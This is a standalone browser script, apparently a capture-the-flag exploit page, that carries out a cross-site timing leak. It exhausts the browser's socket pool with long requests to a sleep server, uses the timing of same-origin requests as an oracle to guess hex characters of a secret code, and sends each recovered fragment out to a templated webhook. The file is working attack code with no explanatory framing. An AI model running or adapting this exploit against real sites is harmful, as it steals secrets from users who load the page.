<script>

    LOG = 'Starting'
    SOCKETLIMIT = 255;
    MYSERVER = `sleep.xxxxxxxxxxxxxxxx.it`
    
    let resimg = 0;
    let res = 0;
    let startIndex = 0;

    let controllers = []
    let queued = []
    let end_times = [];
    guessed = false;
    done = false;
    let leaked_code = "";

    const sleep = (ms) => {
        return new Promise(resolve => {
            setTimeout(resolve, ms);
        });
    }

    const fetch_sleep_long = (i) => {
        controller = new AbortController();
        const signal = controller.signal;
        
        fetch(`http://${i}.${MYSERVER}/120?q=${i}`, {
            mode: 'no-cors',
            signal: signal
        });

        return controller
    }

    const fetch_sleep_short = async (i) => {
        let start = performance.now();
        await fetch(`http://${i}.${MYSERVER}/0?q=${i}`, {
            mode: 'no-cors'
        });

        let duration = performance.now() - start;
        console.log("SLEEP SHORT", duration)
        console.log("a aaaaaaaaaaaa");

        // 1000?
        if(duration > 800){
            guessed = true;
        }

        return duration;
    }
    
    const block_socket = async (i) => {
        fetch_sleep_long(i);
        await sleep(0);
    }
    
    const exhaust_sockets = async() => {
        let i = 0
        for (; i < SOCKETLIMIT; i++) {
            block_socket(i);
        }
        console.log(`Used ${i} connections`);
    }

    async function fetch_same_origin(i){
        let start = performance.now();

        let controller = new AbortController();
        controllers.push(controller);

        await fetch("/", {
            mode: 'no-cors',
            priority: "high",
            signal: controller.signal
        });
        
        let duration = performance.now() - start;

        done = true;
    }
    
    const charset = 'ABCDEF0987654321'.split('');

    async function oracle2(){
        done = false;
        let hashmap = {
            1: "A",
            2: "B",
            3: "C",
            4: "D",
            5: "E",
            6: "F",
            7: "0",
            8: "9",
            9: "8",
            10: "7",
            11: "6",
            12: "5",
            13: "4",
            14: "3",
            15: "2",
            16: "1"
        }

        let res_blocker_controller = await fetch_sleep_long(1337);
        for(let i = 0; i < 5; i++){
            fetch_same_origin(i)
        }

        // Wait until the first font is requested and then free the socket
        await sleep(4000)
        res_blocker_controller.abort();
    
        let should_sleep = 2700;
        for(let i = 0; i < 32; i++){
            await fetch_sleep_short(i)

            if(done){
                console.log("Try 2:", hashmap[i + 1 - 2]);
                console.log("Try 1:", hashmap[i - 2]);

                return [hashmap[i + 1 - 2], hashmap[i - 2] || "A"];
            }

        }

        return null
    }

    async function main(){
        await sleep(1000);
        await exhaust_sockets();

        setTimeout(async () => {
            let result1 = await oracle2();
            console.log("RESULT 1", result1)

            leaked_code += result1[1]
            await fetch(`{{ webhook }}?token=${encodeURIComponent(leaked_code)}`, {
                mode: 'no-cors'
            });
        }, 1000)

        setTimeout(async () => {
            let result1 = await oracle2();
            console.log("RESULT 2", result1)

            leaked_code += result1[1]
            await fetch(`{{ webhook }}?token=${encodeURIComponent(leaked_code)}`, {
                mode: 'no-cors'
            });
        }, 11000)

        setTimeout(async () => {
            let result1 = await oracle2();
            console.log("RESULT 3", result1)

            leaked_code += result1[1]
            await fetch(`{{ webhook }}?token=${encodeURIComponent(leaked_code)}`, {
                mode: 'no-cors'
            });
        }, 21000)

        setTimeout(async () => {
            let result1 = await oracle2();
            console.log("RESULT 4", result1)

            leaked_code += result1[1]
            await fetch(`{{ webhook }}?token=${encodeURIComponent(leaked_code)}`, {
                mode: 'no-cors'
            });
        }, 31000)

        setTimeout(async () => {
            let result1 = await oracle2();
            console.log("RESULT 5", result1)

            leaked_code += result1[1]
            await fetch(`{{ webhook }}?token=${encodeURIComponent(leaked_code)}`, {
                mode: 'no-cors'
            });
        }, 41000)

        setTimeout(async () => {
            let result1 = await oracle2();
            console.log("RESULT 6", result1)

            leaked_code += result1[1];

            await fetch(`{{ webhook }}?token=${encodeURIComponent(leaked_code)}`, {
                mode: 'no-cors'
            });
        }, 51000)

    }

    main();
    
    </script>